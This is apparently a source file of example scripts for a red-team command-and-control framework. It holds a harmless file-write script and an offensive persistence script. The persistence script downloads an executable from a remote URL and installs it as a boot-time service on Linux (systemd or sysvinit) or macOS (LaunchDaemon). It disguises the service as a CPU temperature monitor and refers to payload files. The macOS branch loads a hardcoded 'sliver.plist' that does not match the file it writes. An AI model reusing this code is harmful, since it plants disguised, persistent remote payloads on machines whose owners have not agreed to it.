export const FILE_WRITE_EXAMPLE = {
    metadata: `name: Write File
description: Write the given utf-8 content to a file
author: cictrone
support_model: FIRST_PARTY
tactic: EXECUTION
paramdefs:
- name: path
  type: string
  label: File path
  placeholder: "/tmp/cat.txt"
- name: content
  type: string
  label: Content to write
  placeholder: "meow"
`,
    script: `
def main():
    new_file_path = input_params['path']
    new_file_parent_dir = file.parent_dir(new_file_path)
    new_file_content = input_params['content']

    # if file parent directory does not exist, error and exit.
    if not file.exists(new_file_parent_dir):
        eprint(
            f"[ERROR] Parent Directory for File does not exist at path: '{new_file_path}'.")
        eprint(f"[ERROR] Exiting...")
        return

    # if file exists, remove it.
    if file.exists(new_file_path):
        print(
            "[INFO] File was detected at the path before write. Trying to remove the file...")
        file.remove(new_file_path)
        print("[INFO] File was successfully removed!")

    # if unable to write to destination will error
    file.write(new_file_path, new_file_content)

    # Print a Success!
    print(f"[INFO] The file '{new_file_path}' was successfully written!")


main()
`
};

export const PERSIST_SERVICE_EXAMPLE = {
    metadata: `name: Create Service
description: Create a service for a specific binary
author: hulto
support_model: FIRST_PARTY
tactic: PERSISTENCE
paramdefs:
- name: executable_url
  type: string
  label: Executable URL
  placeholder: https://example.com/executable_path
- name: service_name
  type: string
  label: Service name
  placeholder: cpu-tempd
- name: service_desc
  type: string
  label: Service description
  placeholder: CPU Temperature monitoring service
- name: executable_name
  type: string
  label: Executable name
  placeholder: cpud
`,
    script: `systemd_service_template = """[Unit]
Description={{ SERVICE_DESC }}
Requires=network.target
After=network.target

[Service]
Type=simple
{% if SERVICE_WORKING_DIR is defined %}
WorkingDirectory={{ SERVICE_WORKING_DIR }}
{% endif %}
ExecStart={{ SERVICE_START_CMD }}
{% if SERVICE_STOP_CMD is defined %}
ExecStop={{ SERVICE_STOP_CMD }}
{% endif %}
{% if SERVICE_START_PRE_CMD is defined %}
ExecStartPre={{ SERVICE_START_PRE_CMD }}
{% endif %}
{% if SERVICE_PID_FILE is defined %}
PIDFile={{ SERVICE_PID_FILE }}
{% endif %}

[Install]
WantedBy=multi-user.target
"""

sysvinit_template = """#!/bin/sh
### BEGIN INIT INFO
# Provides:          {{ SERVICE_NAME }}
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: {{ SERVICE_DESC }}
# Description:       {{ SERVICE_DESC }}
### END INIT INFO

cmd={{ SERVICE_START_CMD }}

name=\`basename \$0\`
pid_file="/var/run/\$name.pid"

get_pid() {
    cat "\$pid_file"
}

is_running() {
    [ -f "\$pid_file" ] && ps -p \`get_pid\` > /dev/null 2>&1
}


case "\$1" in
    start)
    if is_running; then
        echo "Already started"
    else
        echo "Starting \$name"
        cd "\$dir"

        \$cmd &

        echo \$! > "\$pid_file"
        if ! is_running; then
            echo "Unable to start, see \$stdout_log and \$stderr_log"
            exit 1
        fi
    fi
    ;;
    stop)
    if is_running; then
        echo -n "Stopping \$name.."
        kill \`get_pid\`
        for i in 1 2 3 4 5 6 7 8 9 10
        do
            if ! is_running; then
                break
            fi

            echo -n "."
            sleep 1
        done
        echo

        if is_running; then
            echo "Not stopped; may still be shutting down or shutdown may have failed"
            exit 1
        else
            echo "Stopped"
            if [ -f "\$pid_file" ]; then
                rm "\$pid_file"
            fi
        fi
    else
        echo "Not running"
    fi
    ;;
    restart)
    \$0 stop
    if is_running; then
        echo "Unable to stop, will not attempt to start"
        exit 1
    fi
    \$0 start
    ;;
    status)
    if is_running; then
        echo "Running"
    else
        echo "Stopped"
        exit 1
    fi
    ;;
    *)
    echo "Usage: \$0 {start|stop|restart|status}"
    exit 1
    ;;
esac

exit 0
"""

launch_daemon_template = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{{ service_name }}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{ bin_path }}</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
"""

def is_using_systemd():
    command_get_res = sys.shell("command -v systemctl")
    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
        for canary in ["/run/systemd/system/", "/dev/.run/systemd/", "/dev/.systemd/"]:
            if file.is_dir(canary):
                return True
    return False

def is_using_sysvinit():
    command_get_res = sys.shell("command -v update-rc.d")
    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
        return True
    return False

def systemd(service_name, service_desc, executable_path, executable_url):
    # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
    file.write("/tmp/systemd.service.j2", systemd_service_template)
    args = {
        "SERVICE_NAME":service_name,
        "SERVICE_DESC":service_desc,
        "SERVICE_START_CMD":executable_path
    }
    file.template("/tmp/systemd.service.j2","/usr/lib/systemd/system/"+service_name+".service", args, False)
    file.remove("/tmp/systemd.service.j2")

    # assets.copy("persist_service/files/payload.elf", executable_path)
    http.download(executable_url, executable_path)
    sys.shell("chmod +x "+executable_path)

    sys.shell("systemctl daemon-reload "+service_name)
    sys.shell("systemctl enable "+service_name)
    sys.shell("systemctl start "+service_name)

def sysvinit(service_name, service_desc, executable_path, executable_url):
    # assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
    file.write("/tmp/svc.sh.j2", sysvinit_template)
    args = {
        "SERVICE_NAME":service_name,
        "SERVICE_DESC":service_desc,
        "SERVICE_START_CMD":executable_path
    }
    file.template("/tmp/svc.sh.j2","/etc/init.d/"+service_name, args, False)
    file.remove("/tmp/svc.sh.j2")
    sys.shell("chmod +x "+"/etc/init.d/"+service_name)

    # assets.copy("persist_service/files/payload.elf", executable_path)
    http.download(executable_url, executable_path)
    sys.shell("chmod +x "+executable_path)

    sys.shell("update-rc.d "+service_name+" defaults")
    sys.shell("service "+service_name+" start")

def launch_daemon(service_name, executable_path, executable_url):
    # assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
    file.write("/tmp/plist.j2",launch_daemon_template)
    args = {
        "service_name":"com.testing."+service_name,
        "bin_path":executable_path
    }
    file.template("/tmp/plist.j2","/Library/LaunchDaemons/"+service_name+".plist", args, False)
    file.remove("/tmp/plist.j2")

    # assets.copy("persist_service/files/payload.macho", executable_path)
    http.download(executable_url, executable_path)
    sys.shell("chmod +x "+executable_path)
    sys.shell("launchctl load -w /Library/LaunchDaemons/sliver.plist")

def persist_service(service_name, service_desc, executable_name, executable_url):
    if sys.is_linux():
        executable_path = "/usr/local/bin/"+executable_name
        if is_using_systemd():
            systemd(service_name, service_desc, executable_path, executable_url)
        elif is_using_sysvinit():
            sysvinit(service_name, service_desc, executable_path, executable_url)
    elif sys.is_macos():
        executable_path = "/var/root/"+executable_name
        launch_daemon(service_name, executable_path, executable_url)
    else:
        eprint("OS not supported")

persist_service(
    input_params['service_name'],
    input_params['service_desc'],
    input_params['executable_name'],
    input_params['executable_url']
)
print("")
`
};
